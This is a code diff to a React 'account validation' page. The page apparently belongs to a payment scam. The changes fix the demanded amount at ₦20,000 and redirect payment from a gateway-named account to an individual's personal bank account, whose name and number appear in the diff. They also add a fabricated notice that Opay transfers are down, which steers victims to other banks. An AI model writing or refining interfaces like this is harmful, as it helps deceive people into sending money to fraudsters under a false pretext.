@@ -1,8 +1,9 @@
+
 import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-import { ArrowLeft, Copy, CheckCircle, XCircle } from 'lucide-react';
+import { ArrowLeft, Copy, CheckCircle, XCircle, AlertTriangle } from 'lucide-react';
 
 interface AccountValidationPageProps {
   onBack: () => void;
@@ -11,12 +12,11 @@ interface AccountValidationPageProps {
 }
 
 const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, userEmail, userName }) => {
-  const [currentStep, setCurrentStep] = useState<'form' | 'loading' | 'payment' | 'processing' | 'failed'>('form');
+  const [currentStep, setCurrentStep] = useState<'form' | 'loading' | 'warning' | 'payment' | 'processing' | 'failed'>('form');
   const [formData, setFormData] = useState({
     fullName: userName,
     email: userEmail,
-    phoneNumber: '',
-    amount: ''
+    amount: '20000'
   });
 
   const copyToClipboard = (text: string) => {
@@ -27,8 +27,12 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
     setCurrentStep('loading');
 
     setTimeout(() => {
-      setCurrentStep('payment');
+      setCurrentStep('warning');
     }, 2000);
+  };
+
+  const handleWarningContinue = () => {
+    setCurrentStep('payment');
   };
 
   const handlePaymentConfirm = () => {
@@ -76,28 +80,6 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
                 />
               </div>
 
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
-                <Input
-                  type="tel"
-                  value={formData.phoneNumber}
-                  onChange={(e) => setFormData({ ...formData, phoneNumber: e.target.value })}
-                  placeholder="Enter your phone number"
-                  className="h-12 rounded-xl"
-                />
-              </div>
-
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Amount (₦)</label>
-                <Input
-                  type="number"
-                  value={formData.amount}
-                  onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
-                  placeholder="Enter amount"
-                  className="h-12 rounded-xl"
-                />
-              </div>
-
               <Button
                 onClick={handleSubmit}
                 className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl"
@@ -123,6 +105,52 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
     );
   }
 
+  // Warning step with Opay service notice
+  if (currentStep === 'warning') {
+    return (
+      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
+        <div className="bg-white rounded-2xl shadow-lg max-w-md w-full">
+          <div className="flex items-center justify-between p-4 border-b">
+            <div className="flex items-center gap-3">
+              <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
+                <div className="w-4 h-4 bg-white rounded-sm"></div>
+              </div>
+              <h2 className="text-lg font-semibold text-gray-900">Service Notice</h2>
+            </div>
+            <button onClick={onBack} className="text-gray-400 hover:text-gray-600">
+              <XCircle size={20} />
+            </button>
+          </div>
+
+          <div className="p-6">
+            <div className="bg-orange-50 border-l-4 border-orange-400 p-4 mb-6">
+              <div className="flex items-start gap-3">
+                <AlertTriangle className="text-orange-600 mt-1" size={20} />
+                <div>
+                  <h3 className="text-orange-800 font-semibold mb-2">Opay Bank Service Down</h3>
+                  <p className="text-orange-700 text-sm mb-3">
+                    We're currently experiencing issues with Opay bank transfers. Please use other banks for your payments.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <p className="text-gray-600 mb-6">
+              We apologize for any inconvenience. All other banks are working normally and your payment will be processed immediately.
+            </p>
+
+            <Button
+              onClick={handleWarningContinue}
+              className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white rounded-xl"
+            >
+              I Understand
+            </Button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
   // Payment step with updated account details
   if (currentStep === 'payment') {
     return (
@@ -143,8 +171,8 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
                 <div className="flex justify-between items-center">
                   <span className="text-blue-100">Account Number:</span>
                   <div className="flex items-center gap-2">
-                    <span className="font-mono">5268583383</span>
-                    <button onClick={() => copyToClipboard('5268583383')} className="text-blue-200 hover:text-white">
+                    <span className="font-mono">6056570413</span>
+                    <button onClick={() => copyToClipboard('6056570413')} className="text-blue-200 hover:text-white">
                       <Copy size={16} />
                     </button>
                   </div>
@@ -153,8 +181,8 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
                 <div className="flex justify-between items-center">
                   <span className="text-blue-100">Account Name:</span>
                   <div className="flex items-center gap-2">
-                    <span className="font-medium">CORALPAY-NextGen PG</span>
-                    <button onClick={() => copyToClipboard('CORALPAY-NextGen PG')} className="text-blue-200 hover:text-white">
+                    <span className="font-medium">CHUKWUEMEKA AMADI JAMES</span>
+                    <button onClick={() => copyToClipboard('CHUKWUEMEKA AMADI JAMES')} className="text-blue-200 hover:text-white">
                       <Copy size={16} />
                     </button>
                   </div>
@@ -163,8 +191,8 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
                 <div className="flex justify-between items-center">
                   <span className="text-blue-100">Bank:</span>
                   <div className="flex items-center gap-2">
-                    <span className="font-medium">Sterling Bank</span>
-                    <button onClick={() => copyToClipboard('Sterling Bank')} className="text-blue-200 hover:text-white">
+                    <span className="font-medium">Moniepoint MFB</span>
+                    <button onClick={() => copyToClipboard('Moniepoint MFB')} className="text-blue-200 hover:text-white">
                       <Copy size={16} />
                     </button>
                   </div>
@@ -172,7 +200,7 @@ const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, u
 
                 <div className="flex justify-between items-center">
                   <span className="text-blue-100">Amount:</span>
-                  <span className="font-bold text-lg">₦{formData.amount}</span>
+                  <span className="font-bold text-lg">₦20,000</span>
                 </div>
               </div>
             </CardContent>
